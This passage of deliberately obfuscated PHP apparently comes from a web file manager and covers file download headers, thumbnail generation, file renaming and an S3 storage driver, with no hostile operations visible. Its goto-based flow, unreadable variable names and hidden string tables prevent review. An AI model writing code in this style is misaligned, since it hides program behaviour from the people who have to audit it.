0; $eŞíÒİƒÛ‰ = $D£Â·Œòà - 1; $FÎÁ÷ÜÚÚ› = $this->ext($aœÃêâˆ); goto aàùí¢—Ö; AÜÀÑ›Ò: header($Bµø–“î˜§[132] . $B¬‰¨ÏÎƒ . $Bµø–“î˜§[124]); header($Bµø–“î˜§[133] . $aœÃêâˆ); header($Bµø–“î˜§[134]); goto cŒåñ±¦îê; c·±é˜¯·Í: $D£Â·Œòà = $eàİÎ¬•Ïà[$Bµø–“î˜§[77]]; $B¬‰¨ÏÎƒ = gmdate($Bµø–“î˜§[106], $eàİÎ¬•Ïà[$Bµø–“î˜§[107]]); $aœÃêâˆ = $cŸ¬ŠĞÆ¯ó ? $cŸ¬ŠĞÆ¯ó : $this->iconvApp($eàİÎ¬•Ïà[$Bµø–“î˜§[28]]); goto f²ÂÏ¼©Á; EÒÜøÁóã: @ob_end_clean(); set_timeout(); $eàİÎ¬•Ïà = $this->infoFull($BÎó¬ÄÑø); goto c·±é˜¯·Í; aàùí¢—Ö: if (in_array($FÎÁ÷ÜÚÚ›, array($Bµø–“î˜§[108], $Bµø–“î˜§[109], $Bµø–“î˜§[110], $Bµø–“î˜§[111]))) { $FÎÁ÷ÜÚÚ› = $Bµø–“î˜§[112]; } if (!$d‡Ë–Û…É) { $d‡Ë–Û…É = md5($B¬‰¨ÏÎƒ . $this->hashSimple($BÎó¬ÄÑø)); } $d‡Ë–Û…É = $Bµø–“î˜§[113] . $d‡Ë–Û…É . $Bµø–“î˜§[113]; goto fÍ¡‚±´İ´; EÃÛŸĞƒ: $dŸòˆ¥Ã«õ = $this->getType() == $Bµø–“î˜§[103]; $Cù·í—åç = $GLOBALS[$Bµø–“î˜§[6]][$Bµø–“î˜§[84]][$Bµø–“î˜§[91]][$Bµø–“î˜§[104]]; $fµ×¶‘Ñ¦ = (double) $GLOBALS[$Bµø–“î˜§[6]][$Bµø–“î˜§[84]][$Bµø–“î˜§[91]][$Bµø–“î˜§[105]] * 1024 * 1024; goto EÒÜøÁóã; b‰È×áùö«: header($Bµø–“î˜§[125]); header($Bµø–“î˜§[126]); header($Bµø–“î˜§[127]); goto DØ¢é„¦; fÍ¡‚±´İ´: $b•ÀŸ¤é¼ç = get_file_mime($FÎÁ÷ÜÚÚ›); if (strstr($b•ÀŸ¤é¼ç, $Bµø–“î˜§[114])) { $b•ÀŸ¤é¼ç = $b•ÀŸ¤é¼ç . $Bµø–“î˜§[115]; } if ($E”¶ØšÆ¥Ÿ === !1 && !mime_support($b•ÀŸ¤é¼ç)) { $E”¶ØšÆ¥Ÿ = !0; $b•ÀŸ¤é¼ç = $Bµø–“î˜§[116]; } goto dß®Š§Õ«Ô; cŒåñ±¦îê: header($Bµø–“î˜§[135] . $D£Â·Œòà); header($Bµø–“î˜§[136]); if (!$E”¶ØšÆ¥Ÿ && $FÎÁ÷ÜÚÚ› == $Bµø–“î˜§[137]) { if ($D£Â·Œòà > 1024 * 1024 * 5) { die; } $AÆæíŸã‡¯ = $this->getContent($BÎó¬ÄÑø); $AÆæíŸã‡¯ = Html::removeXXS($AÆæíŸã‡¯); echo $AÆæíŸã‡¯; die; } goto Bî“¨í†ï; DØ¢é„¦: if (isset($_SERVER[$Bµø–“î˜§[128]]) && strtotime($_SERVER[$Bµø–“î˜§[128]]) == $eàİÎ¬•Ïà[$Bµø–“î˜§[107]]) { header($Bµø–“î˜§[129], !0, 304); die; } if (isset($_SERVER[$Bµø–“î˜§[130]]) && $_SERVER[$Bµø–“î˜§[130]] == $d‡Ë–Û…É) { header($Bµø–“î˜§[131] . $d‡Ë–Û…É, !0, 304); die; } header($Bµø–“î˜§[131] . $d‡Ë–Û…É); goto AÜÀÑ›Ò; b«¸ì¤„¿Ç: header($Bµø–“î˜§[121]); header($Bµø–“î˜§[122] . $b•ÀŸ¤é¼ç); header($Bµø–“î˜§[123] . gmdate($Bµø–“î˜§[106], time() + 3600 * 24 * 30) . $Bµø–“î˜§[124]); goto b‰È×áùö«; dß®Š§Õ«Ô: $b…–É‰‡Ê¡ = rawurlencode($aœÃêâˆ); $b…–É‰‡Ê¡ = $Bµø–“î˜§[113] . $b…–É‰‡Ê¡ . $Bµø–“î˜§[117] . $b…–É‰‡Ê¡; if ($E”¶ØšÆ¥Ÿ) { header($Bµø–“î˜§[118]); header($Bµø–“î˜§[119] . $b…–É‰‡Ê¡); } else { header($Bµø–“î˜§[120] . $b…–É‰‡Ê¡); } goto b«¸ì¤„¿Ç; D±«Û¨œÃ: header($Bµø–“î˜§[150] . ($eŞíÒİƒÛ‰ - $f¸‘Æ¦‰Œ + 1)); if ($_SERVER[$Bµø–“î˜§[151]] == $Bµø–“î˜§[152]) { return; } $DÑ… ¾Å½˜ = 1024 * 100; goto A°òô©îŒö; fªÒä¡¼Ä: } public function fileOutServer($b¹­”‚æÛ¨, $bÏ¼ø ¤÷µ = false, $a’†‹¤Ş·À = false, $DÛ‰ƒ¤Ïß• = '') { $this->fileOut($b¹­”‚æÛ¨, $bÏ¼ø ¤÷µ, $a’†‹¤Ş·À, $DÛ‰ƒ¤Ïß•); } public function fileOutLink($c†ËÒëËôÔ) { header($_SERVER[¢à][153] . $c†ËÒëËôÔ); die; } public function cacheMethod($DŒØ´•†íÀ, $Cİ„îèçé³) { goto aÜ»›¢Û¯; aÜ»›¢Û¯: $d­§¯õŞİ =& $_SERVER[¢à]; static $cÚ¸ËÅÖ©Ë = array(); $C¾ä’µØ“ƒ = $d­§¯õŞİ[154] . $DŒØ´•†íÀ . $d­§¯õŞİ[155] . rtrim($Cİ„îèçé³, $d­§¯õŞİ[8]); goto eğƒÌ¹ïã; eğƒÌ¹ïã: if (is_null($DŒØ´•†íÀ)) { $cÚ¸ËÅÖ©Ë = array(); return; } if (is_null($Cİ„îèçé³)) { unset($cÚ¸ËÅÖ©Ë[$C¾ä’µØ“ƒ]); return; } $aôÄ…Ã®Ş = isset($cÚ¸ËÅÖ©Ë[$C¾ä’µØ“ƒ]) ? $cÚ¸ËÅÖ©Ë[$C¾ä’µØ“ƒ] : null; goto FİçØ´ÈÑÆ; b ’˜éê§‚: return $aôÄ…Ã®Ş; goto aÑêÄ©‡·; FİçØ´ÈÑÆ: if (!is_null($aôÄ…Ã®Ş)) { return $aôÄ…Ã®Ş; } $aôÄ…Ã®Ş = $this->{$DŒØ´•†íÀ}($Cİ„îèçé³); $cÚ¸ËÅÖ©Ë[$C¾ä’µØ“ƒ] = $aôÄ…Ã®Ş; goto b ’˜éê§‚; aÑêÄ©‡·: } public function fileOutImage($BÑ’ªÊ±©ò, $BÎ™ÔùÍğ = 250) { goto aö÷ŞĞà™»; dš†Ã¸ˆÌ: if ($b©µ´é¢»µ[$dˆƒ§Š¬ìä[77]] <= 1024 * 50 || !function_exists($dˆƒ§Š¬ìä[156]) || $b©µ´é¢»µ[$dˆƒ§Š¬ìä[157]] == $dˆƒ§Š¬ìä[158]) { return $this->fileOut($BÑ’ªÊ±©ò); } if (isset($b©µ´é¢»µ[$dˆƒ§Š¬ìä[159]][$dˆƒ§Š¬ìä[160]])) { $AÒ‡ŸÓÂÂ­ = $b©µ´é¢»µ[$dˆƒ§Š¬ìä[159]][$dˆƒ§Š¬ìä[160]]; } else { if (isset($b©µ´é¢»µ[$dˆƒ§Š¬ìä[159]][$dˆƒ§Š¬ìä[161]])) { $AÒ‡ŸÓÂÂ­ = $b©µ´é¢»µ[$dˆƒ§Š¬ìä[159]][$dˆƒ§Š¬ìä[161]]; } else { $AÒ‡ŸÓÂÂ­ = md5("{$b©µ´é¢»µ[$dˆƒ§Š¬ìä[28]]}\137{$b©µ´é¢»µ[$dˆƒ§Š¬ìä[75]]}\x5f{$b©µ´é¢»µ[$dˆƒ§Š¬ìä[77]]}"); } } $bÈ¯§¨¦Àè = "{$AÒ‡ŸÓÂÂ­}\x5f{$BÎ™ÔùÍğ}\56\160\156\x67"; goto Eˆ¥ÕàÁ­À; eÆ‹Ë¬ï©œ: $AâäåÖ… ã = DATA_THUMB . $bÈ¯§¨¦Àè; if (!@file_exists($AâäåÖ… ã)) { $CæİŒŸÏ” = TEMP_FILES; if (!is_dir($CæİŒŸÏ”)) { mk_dir($CæİŒŸÏ”); } $b´îÑÉí¬Ÿ = $CæİŒŸÏ” . $AÒ‡ŸÓÂÂ­ . $dˆƒ§Š¬ìä[93] . $b©µ´é¢»µ[$dˆƒ§Š¬ìä[157]]; if (!@file_exists($b´îÑÉí¬Ÿ)) { $b´îÑÉí¬Ÿ = $this->download($BÑ’ªÊ±©ò, $b´îÑÉí¬Ÿ); } $Aì…ŸÙğÑ­ = new ImageThumb($b´îÑÉí¬Ÿ, $dˆƒ§Š¬ìä[164]); $Aì…ŸÙğÑ­->prorate($AâäåÖ… ã, $BÎ™ÔùÍğ, $BÎ™ÔùÍğ * 10); } if (!file_exists($AâäåÖ… ã) || filesize($AâäåÖ… ã) < 100) { return @file_exists($b´îÑÉí¬Ÿ) ? IO::fileOut($b´îÑÉí¬Ÿ) : $this->fileOut($BÑ’ªÊ±©ò); } goto eÍÑÜÁÏ¯“; aö÷ŞĞà™»: $dˆƒ§Š¬ìä =& $_SERVER[¢à]; if (substr($BÑ’ªÊ±©ò, 0, 4) == $dˆƒ§Š¬ìä[143]) { $this->fileOutLink($BÑ’ªÊ±©ò); } $b©µ´é¢»µ = $this->info($BÑ’ªÊ±©ò); goto dš†Ã¸ˆÌ; eÍÑÜÁÏ¯“: if (!($d¿æğÓ–ğ = IO::move($AâäåÖ… ã, $E«®™÷šóò))) { return IO::fileOut($AâäåÖ… ã); } del_file($AâäåÖ… ã); IO::fileOut($d¿æğÓ–ğ); goto F·‚ÃÌ ; Eˆ¥ÕàÁ­À: if (!($bŠ§ğÙİÅ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $dˆƒ§Š¬ìä[162]))) { $E«®™÷šóò = IO::mkdir(IO_PATH_SYSTEM_TEMP . $dˆƒ§Š¬ìä[163]); } else { $E«®™÷šóò = KodIO::make($bŠ§ğÙİÅ); } if ($bŠ§ğÙİÅ = IO::fileNameExist($E«®™÷šóò, $bÈ¯§¨¦Àè)) { $AâäåÖ… ã = KodIO::make($bŠ§ğÙİÅ); return IO::fileOut($AâäåÖ… ã); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto eÆ‹Ë¬ï©œ; F·‚ÃÌ : } public function fileOutImageServer($F»†£åİÀÀ, $DÒ‚Èè§Ÿé = 250) { $this->fileOutImage($F»†£åİÀÀ, $DÒ‚Èè§Ÿé); } public function fileNameAuto($A³›ÃĞ‰çš, $F¦‘Å­†ªÕ, $cÖÌÆÛáÚ‡ = REPEAT_RENAME, $FÑç÷Šå£¶ = false) { goto eö®ˆÉæà; F¤„ù©ç”: $a¢©éãõ§é = 1; $A¾´ÂÒÜ = substr($F¦‘Å­†ªÕ, 0, strlen($F¦‘Å­†ªÕ) - strlen($A³ÇˆÒèÁ¡)); $dñõ‹ƒİƒÀ = $A¾´ÂÒÜ . "\x28{$a¢©éãõ§é}\51{$A³ÇˆÒèÁ¡}"; goto C¹¿åÁÒÙ; C¹¿åÁÒÙ: while ($this->exist(rtrim($A³›ÃĞ‰çš, $AÇö‘ØÌ¹œ[8]) . $AÇö‘ØÌ¹œ[8] . $dñõ‹ƒİƒÀ)) { $dñõ‹ƒİƒÀ = $A¾´ÂÒÜ . "\50{$a¢©éãõ§é}\51{$A³ÇˆÒèÁ¡}"; $a¢©éãõ§é++; } return $dñõ‹ƒİƒÀ; goto cä¬ï·£”ˆ; eö®ˆÉæà: $AÇö‘ØÌ¹œ =& $_SERVER[¢à]; $F”‡Ğ‹İ³“ = $A³›ÃĞ‰çš === $AÇö‘ØÌ¹œ[33] ? $F¦‘Å­†ªÕ : rtrim($A³›ÃĞ‰çš, $AÇö‘ØÌ¹œ[8]) . $AÇö‘ØÌ¹œ[8] . $F¦‘Å­†ªÕ; if ($cÖÌÆÛáÚ‡ == REPEAT_REPLACE || !$this->exist($F”‡Ğ‹İ³“) || $FÑç÷Šå£¶ && $cÖÌÆÛáÚ‡ != REPEAT_RENAME_FOLDER) { return $F¦‘Å­†ªÕ; } goto cË­ÉğğòÃ; cË­ÉğğòÃ: if ($cÖÌÆÛáÚ‡ == REPEAT_SKIP) { return !1; } $A³ÇˆÒèÁ¡ = $AÇö‘ØÌ¹œ[93] . get_path_ext($F¦‘Å­†ªÕ); $A³ÇˆÒèÁ¡ = $A³ÇˆÒèÁ¡ == $AÇö‘ØÌ¹œ[93] || $FÑç÷Šå£¶ ? $AÇö‘ØÌ¹œ[33] : $A³ÇˆÒèÁ¡; goto F¤„ù©ç”; cä¬ï·£”ˆ: } public function listAllFiles($eàŸÍ“èç‘, $eƒ¿í±Éæ, $A³ù’´ÈÅ = array()) { goto BĞµ°®ÓÍÎ; BĞµ°®ÓÍÎ: $Eçâ…·â =& $_SERVER[¢à]; if (empty($eƒ¿í±Éæ)) { return array(); } $F·È¯ÂˆÏæ = array(); goto a“Ì”çÔÂæ; eŸôø™®×„: foreach (array_unique($F·È¯ÂˆÏæ) as $c÷…¨‹‚šé) { $E‡àÉ¬´ = array($Eçâ…·â[75] => $this->getPathOuter($Eçâ…·â[8] . $eàŸÍ“èç‘ . $Eçâ…·â[8] . $c÷…¨‹‚šé), $Eçâ…·â[76] => 1, $Eçâ…·â[77] => 0); if (substr($c÷…¨‹‚šé, -1) != $Eçâ…·â[8]) { $E‡àÉ¬´[$Eçâ…·â[76]] = 0; $A“ÊÛ˜¸¸ = $this->getPath($eàŸÍ“èç‘ . $Eçâ…·â[8] . $c÷…¨‹‚šé); $E‡àÉ¬´[$Eçâ…·â[77]] = isset($A³ù’´ÈÅ[$A“ÊÛ˜¸¸]) ? $A³ù’´ÈÅ[$A“ÊÛ˜¸¸] : $this->size($A“ÊÛ˜¸¸); } $a…—¤ Ãóå[] = $E‡àÉ¬´; } return $a…—¤ Ãóå; goto a¶èäÊİë¶; a“Ì”çÔÂæ: $eàŸÍ“èç‘ = trim($eàŸÍ“èç‘, $Eçâ…·â[8]); foreach ($eƒ¿í±Éæ as $c÷…¨‹‚šé) { $eêÛãš‘Éô = ltrim(substr($c÷…¨‹‚šé, strlen($eàŸÍ“èç‘)), $Eçâ…·â[8]); $F·È¯ÂˆÏæ = array_merge($F·È¯ÂˆÏæ, $this->slicePath($eêÛãš‘Éô)); } $a…—¤ Ãóå = array(); goto eŸôø™®×„; a¶èäÊİë¶: } public function slicePath($c®‰¯ÍØòÈ) { $cºÏ—“Å÷ê =& $_SERVER[¢à]; $A˜ñ×ñ¥¤ = explode($cºÏ—“Å÷ê[8], trim($c®‰¯ÍØòÈ, $cºÏ—“Å÷ê[8])); $aø¬³ÜŒ„ = 0; do { ++$aø¬³ÜŒ„; $cĞ¸„çÔ©[] = implode($cºÏ—“Å÷ê[8], array_slice($A˜ñ×ñ¥¤, 0, $aø¬³ÜŒ„)) . $cºÏ—“Å÷ê[8]; } while ($aø¬³ÜŒ„ < count($A˜ñ×ñ¥¤)); $cĞ¸„çÔ©[count($A˜ñ×ñ¥¤) - 1] = $c®‰¯ÍØòÈ; return $cĞ¸„çÔ©; } public function getHost() { $fÑ·»°˜Í =& $_SERVER[¢à]; $b¯ì–œÕ¿ò = parse_url(trim($this->domain, $fÑ·»°˜Í[8])); $Dµ¸ÙäØ¦­ = isset($b¯ì–œÕ¿ò[$fÑ·»°˜Í[165]]) ? $b¯ì–œÕ¿ò[$fÑ·»°˜Í[165]] : http_type(); $CÏ‹‹İÉÃÊ = isset($b¯ì–œÕ¿ò[$fÑ·»°˜Í[166]]) ? $b¯ì–œÕ¿ò[$fÑ·»°˜Í[166]] : $b¯ì–œÕ¿ò[$fÑ·»°˜Í[75]]; if (isset($b¯ì–œÕ¿ò[$fÑ·»°˜Í[167]])) { $CÏ‹‹İÉÃÊ .= $fÑ·»°˜Í[4] . $b¯ì–œÕ¿ò[$fÑ·»°˜Í[167]]; } return $Dµ¸ÙäØ¦­ . $fÑ·»°˜Í[168] . $CÏ‹‹İÉÃÊ; } public function pathEncode($d¦äÀÌœ¯”) { $fšÉ³ã¿¿ˆ =& $_SERVER[¢à]; return str_replace($fšÉ³ã¿¿ˆ[169], $fšÉ³ã¿¿ˆ[8], rawurlencode($d¦äÀÌœ¯”)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($FÁ“‹Å£Íé) { set_timeout(); require_once SDK_DIR . $_SERVER[¢à][170]; parent::__construct(); $this->_init($FÁ“‹Å£Íé); } public function _init($aøÉºçêáÏ) { foreach ($aøÉºçêáÏ as $cÃóáÅ²Á => $B°ôÎ²÷—î) { if (isset($this->{$cÃóáÅ²Á})) { $this->{$cÃóáÅ²Á} = $B°ôÎ²÷—î; } } $this->endpoint = $aøÉºçêáÏ[$_SERVER[¢à][171]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); $this->client->setChunkSize($this->osChunkSize()); } public function signatureVersion($dÍÚÒÔööë = "\x76\64") { $this->signVer = $dÍÚÒÔööë; $this->client->setSignatureVersion($dÍÚÒÔööë); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto DêÕÍŞï”; aÎÈğ™çî¢: if ($bÜ÷¼–»[$FÏÖøÊÁÄ[172]] != $FÏÖøÊÁÄ[173] || $bÜ÷¼–»[$FÏÖøÊÁÄ[174]] != $FÏÖøÊÁÄ[173]) { return !1; } $e‡¤»ÂÒ¶ = array_map($FÏÖøÊÁÄ[175], $bÜ÷¼–»[$FÏÖøÊÁÄ[176]]); if (!is_array($e‡¤»ÂÒ¶)) { $e‡¤»ÂÒ¶ = array(); } goto c……Ê°ã‰; DêÕÍŞï”: $FÏÖøÊÁÄ =& $_SERVER[¢à]; $bÜ÷¼–» = $this->getBucketCors(); if (!$bÜ÷¼–» || !is_array($bÜ÷¼–»)) { return !1; } goto aÎÈğ™çî¢; c……Ê°ã‰: $aßö÷«ˆ¢ = array($FÏÖøÊÁÄ[177], $FÏÖøÊÁÄ[178], $FÏÖøÊÁÄ[179], $FÏÖøÊÁÄ[180], $FÏÖøÊÁÄ[181]); $C­¯«“ïø» = array_diff($aßö÷«ˆ¢, $e‡¤»ÂÒ¶); return empty($C­¯«“ïø»); goto f†­½ÍÌÖ–; f†­½ÍÌÖ–: } public function mkfile($A´´¯ğÒ„›, $då×ÅîŞ°• = '', $F•‘ã…†êƒ = REPEAT_RENAME) { $Bä×Ã‚«½ò = $this->setContent($A´´¯ğÒ„›, $då×ÅîŞ°•); if ($Bä×Ã‚«½ò !== !1) { return $this->getPathOuter($A´´¯ğÒ„›); } return !1; } public function mkdir($DĞ†ä‡³œ½, $EÄŸ‘±Ã¦Š = REPEAT_SKIP) { if (empty($DĞ†ä‡³œ½)) { return !1; } if ($this->_isFolder($DĞ†ä‡³œ½)) { return $this->getPathOuter($DĞ†ä‡³œ½); } $EŒš”“©°Œ = $this->setContent($DĞ†ä‡³œ½, $_SERVER[¢à][33], !0); if ($EŒš”“©°Œ !== !1) { return $this->getPathOuter($DĞ†ä‡³œ½); } return !1; } public function copyFile($bÒêÒÙÀÓÑ, $bÇã¿‹Î¤ë, $a“÷ÚšÌ  = array()) { $aî‘†ëÃ†í =& $_SERVER[¢à]; $DîëÒÍ’º‰ = $this->objectMeta($bÒêÒÙÀÓÑ); if (!$DîëÒÍ’º‰) { return !1; } if ($DîëÒÍ’º‰[$aî‘†ëÃ†í[77]] <= 1024 * 1024 * 200) { $C”¢Ò‘¥Œ = $this->client->copyObject($this->bucket, $bÒêÒÙÀÓÑ, $this->bucket, $bÇã¿‹Î¤ë, $aî‘†ëÃ†í[182], $a“÷ÚšÌ ); } else { $C”¢Ò‘¥Œ = $this->client->multiCopyObject($this->bucket, $bÒêÒÙÀÓÑ, $this->bucket, $bÇã¿‹Î¤ë, $a“÷ÚšÌ ); } $C”¢Ò‘¥Œ = $C”¢Ò‘¥Œ ? $this->getPathOuter($bÇã¿‹Î¤ë) : !1; return $C”¢Ò‘¥Œ; } public function moveFile($eàÏ¾Êˆœ, $AËÊñ³´²Ş) { if ($this->copyFile($eàÏ¾Êˆœ, $AËÊñ³´²Ş)) { $this->delFile($eàÏ¾Êˆœ); return $this->getPathOuter($AËÊñ³´²Ş); } return !1; } public function delFile($b…Âš÷ã”ò) { return $this->client->deleteObject($this->bucket, $b…Âš÷ã”ò); } public function delFolder($fÂ¡¢ØÓ™é) { goto aŠ¥¥ƒ¶„; Bš–Œ¹¨É¤: $bË©íºÇ•Ÿ = $a‘«ÀĞ˜‘³ = 0; $A…Úö­´‰À = array_chunk(array_keys($AòÎ²Ü‡õó), 1000); foreach ($A…Úö­´‰À as $aì­Ÿ™Å¿) { $bË©íºÇ•Ÿ++; $a‘«ÀĞ˜‘³ += (int) $this->client->deleteObjects($this->bucket, $aì­Ÿ™Å¿); } goto Dğñ×³¬ù; aŠ¥¥ƒ¶„: $Dİ×¯›ñÄÉ =& $_SERVER[¢à]; $AòÎ²Ü‡õó = $this->listObjs($fÂ¡¢ØÓ™é); if (!$AòÎ²Ü‡õó) { $fÂ¡¢ØÓ™é = trim($fÂ¡¢ØÓ™é, $Dİ×¯›ñÄÉ[8]); if (!empty($fÂ¡¢ØÓ™é)) { $fÂ¡¢ØÓ™é .= $Dİ×¯›ñÄÉ[8]; } return $this->delFile($fÂ¡¢ØÓ™é); } goto Bš–Œ¹¨É¤; Dğñ×³¬ù: return $bË©íºÇ•Ÿ === $a‘«ÀĞ˜‘³ ? !0 : !1; goto cğİ¿ÆòÆÇ; cğİ¿ÆòÆÇ: } public function rename($a¥¸†××¡•, $E«óêšÍÆ¤) { return $this->renameObject($a¥¸†××¡•, $E«óêšÍÆ¤); } public function listPath($d¨˜‰¾ó·„, $fœ¥“§ä÷• = false) { $dåÄ¶Ÿ¨µŒ =& $_SERVER[¢à]; $FºÀòŞ‰Ë = $this->listObjs($d¨˜‰¾ó·„, null, null, $dåÄ¶Ÿ¨µŒ[8]); $d“ƒ¾»±Õš = array($dåÄ¶Ÿ¨µŒ[74] => array(), $dåÄ¶Ÿ¨µŒ[73] => array()); foreach ($FºÀòŞ‰Ë as $a„î‡…ìšö => $Bƒ®¢İ‘®Ñ) { if ($a„î‡…ìšö == $dåÄ¶Ÿ¨µŒ[8]) { continue; } if (isset($Bƒ®¢İ‘®Ñ[$dåÄ¶Ÿ¨µŒ[183]])) { $d“ƒ¾»±Õš[$dåÄ¶Ÿ¨µŒ[74]][] = $this->folderInfo($Bƒ®¢İ‘®Ñ[$dåÄ¶Ÿ¨µŒ[183]], $fœ¥“§ä÷•); } else { if (substr($Bƒ®¢İ‘®Ñ[$dåÄ¶Ÿ¨µŒ[28]], -1) == $dåÄ¶Ÿ¨µŒ[8]) { continue; } $d“ƒ¾»±Õš[$dåÄ¶Ÿ¨µŒ[73]][] = $this->fileInfo($Bƒ®¢İ‘®Ñ[$dåÄ¶Ÿ¨µŒ[28]], $fœ¥“§ä÷•, $Bƒ®¢İ‘®Ñ); } } return $d“ƒ¾»±Õš; } private function fileInfo($B±ŒĞ„˜¼, $EÓó‘“®Ò¨ = false, $CÃŠÀÔãë = array()) { goto fÔºì¿ÆÀä; Eàô¤½àÚ‰: if (empty($CÃŠÀÔãë)) { $CÃŠÀÔãë = $this->objectMeta($B±ŒĞ„˜¼); if (!$CÃŠÀÔãë) { return $b‡‘Ó¡ ÑŒ; } } if (isset($CÃŠÀÔãë[$Aºœ‹†›Şù[187]])) { $b‡‘Ó¡ ÑŒ[$Aºœ‹†›Şù[107]] = $CÃŠÀÔãë[$Aºœ‹†›Şù[187]]; } if (isset($CÃŠÀÔãë[$Aºœ‹†›Şù[77]])) { $b‡‘Ó¡ ÑŒ[$Aºœ‹†›Şù[77]] = $CÃŠÀÔãë[$Aºœ‹†›Şù[77]]; } goto b¥¤ºĞÅ¯; b¥¤ºĞÅ¯: return $b‡‘Ó¡ ÑŒ; goto aÉÈ¾ã¦–„; fÔºì¿ÆÀä: $Aºœ‹†›Şù =& $_SERVER[¢à]; if ($EÓó‘“®Ò¨) { return array($Aºœ‹†›Şù[28] => $this->pathThis($B±ŒĞ„˜¼), $Aºœ‹†›Şù[75] => $this->getPathOuter($B±ŒĞ„˜¼), $Aºœ‹†›Şù[29] => $Aºœ‹†›Şù[164], $Aºœ‹†›Şù[157] => $this->ext($B±ŒĞ„˜¼), $Aºœ‹†›Şù[77] => isset($CÃŠÀÔãë[$Aºœ‹†›Şù[77]]) ? $CÃŠÀÔãë[$Aºœ‹†›Şù[77]] : 0, $Aºœ‹†›Şù[184] => 0, $Aºœ‹†›Şù[107] => 0, $Aºœ‹†›Şù[185] => !0, $Aºœ‹†›Şù[186] => !0); } $b‡‘Ó¡ ÑŒ = array($Aºœ‹†›Şù[28] => $this->pathThis($B±ŒĞ„˜¼), $Aºœ‹†›Şù[75] => $this->getPathOuter($B±ŒĞ„˜¼), $Aºœ‹†›Şù[29] => $Aºœ‹†›Şù[164], $Aºœ‹†›Şù[184] => 0, $Aºœ‹†›Şù[107] => 0, $Aºœ‹†›Şù[77] => 0, $Aºœ‹†›Şù[157] => $this->ext($B±ŒĞ„˜¼), $Aºœ‹†›Şù[185] => !0, $Aºœ‹†›Şù[186] => !0); goto Eàô¤½àÚ‰; aÉÈ¾ã¦–„: } private function folderInfo($f‚÷ˆ÷ôø, $DÀâĞæœÕœ = false) { goto bŒÄ¨³£ğ; CŞ¹ÔÚø: if ($f‚÷ˆ÷ôø == $cĞ¶Áçß”†[33]) { return $aìÑŠôš; } $f‚÷ˆ÷ôø = trim($f‚÷ˆ÷ôø, $cĞ¶Áçß”†[8]) . $cĞ¶Áçß”†[8]; $f‰¦¡µŞŸ = $this->objectMeta($f‚÷ˆ÷ôø); goto B˜˜ù ª¬; B˜˜ù ª¬: if (isset($f‰¦¡µŞŸ[$cĞ¶Áçß”†[187]])) { $aìÑŠôš[$cĞ¶Áçß”†[184]] = $f‰¦¡µŞŸ[$cĞ¶Áçß”†[187]]; } return $aìÑŠôš; goto C†£ÓÙòñ; bŒÄ¨³£ğ: $cĞ¶Áçß”† =& $_SERVER[¢à]; if ($DÀâĞæœÕœ) { return array($cĞ¶Áçß”†[28] => $this->pathThis($f‚÷ˆ÷ôø), $cĞ¶Áçß”†[75] => $this->getPathOuter($cĞ¶Áçß”†[8] . $f‚÷ˆ÷ôø), $cĞ¶Áçß”†[29] => $cĞ¶Áçß”†[76], $cĞ¶Áçß”†[185] => !0, $cĞ¶Áçß”†[186] => !0); } $aìÑŠôš = array($cĞ¶Áçß”†[28] => $this->pathThis($f‚÷ˆ÷ôø), $cĞ¶Áçß”†[75] => $this->getPathOuter($cĞ¶Áçß”†[8] . $f‚÷ˆ÷ôø), $cĞ¶Áçß”†[29] => $cĞ¶Áçß”†[76], $cĞ¶Áçß”†[184] => 0, $cĞ¶Áçß”†[107] => 0, $cĞ¶Áçß”†[185] => !0, $cĞ¶Áçß”†[186] => !0); goto CŞ¹ÔÚø; C†£ÓÙòñ: } public function listObjs($Cª’ ¿ÓÅÎ, $bÍËÕôøñ  = null, $DÓÌ¿Ç§¯£ = null, $DŒƒŸÈ‚¹® = null) { $bá“ƒ±Ğåï =& $_SERVER[¢à]; $Cª’ ¿ÓÅÎ = trim($Cª’ ¿ÓÅÎ, $bá“ƒ±Ğåï[8]); $C½¦Õ“ÀÒ¾ = empty($Cª’ ¿ÓÅÎ) ? $bá“ƒ±Ğåï[33] : $Cª’ ¿ÓÅÎ . $bá“ƒ±Ğåï[8]; return $this->client->getBucket($this->bucket, $C½¦Õ“ÀÒ¾, $bÍËÕôøñ , $DÓÌ¿Ç§¯£, $DŒƒŸÈ‚¹®, !0); } public function has($Bã¼ñøãÆŠ, $d¾ˆ£öö = false, $fğíöˆÁ­Ô = true) { goto b¡Ù“©Îî›; E‚º¬é–ó©: if ($d¾ˆ£öö) { return array($d†÷™ŸÈº¹[188] => $D°Öíêùî‚, $d†÷™ŸÈº¹[189] => $E§¯‰¢ÍÎ); } return !1; goto e¦¶æÍùÂè; BìªÅ–‰ˆ: $A‡ÅÓóÇ¤Ù = $this->listObjs($Bã¼ñøãÆŠ, null, null, $d†÷™ŸÈº¹[8]); $A‡ÅÓóÇ¤Ù = is_array($A‡ÅÓóÇ¤Ù) ? $A‡ÅÓóÇ¤Ù : array(); foreach ($A‡ÅÓóÇ¤Ù as $B÷¶„ÛëŒÒ) { if (isset($B÷¶„ÛëŒÒ[$d†÷™ŸÈº¹[28]]) && substr($B÷¶„ÛëŒÒ[$d†÷™ŸÈº¹[28]], -1) != $d†÷™ŸÈº¹[8]) { if (!$d¾ˆ£öö && $fğíöˆÁ­Ô) { return !0; } $D°Öíêùî‚++; } else { if (isset($B÷¶„ÛëŒÒ[$d†÷™ŸÈº¹[183]])) { if (!$d¾ˆ£öö && !$fğíöˆÁ­Ô) { return !1; } $E§¯‰¢ÍÎ++; } } } goto E‚º¬é–ó©; b¡Ù“©Îî›: $d†÷™ŸÈº¹ =& $_SERVER[¢à]; $D°Öíêùî‚ = 0; $E§¯‰¢ÍÎ = 0; goto BìªÅ–‰ˆ; e¦¶æÍùÂè: } public function listAll($fÎ„˜ÉÉ˜) { $b°àİ‚…®¿ =& $_SERVER[¢à]; $b‚àÌâœâï = $this->listObjs($fÎ„˜ÉÉ˜); $AÜÚÇâ¥Ä = $f‹ã’ßğ ƒ = array(); foreach 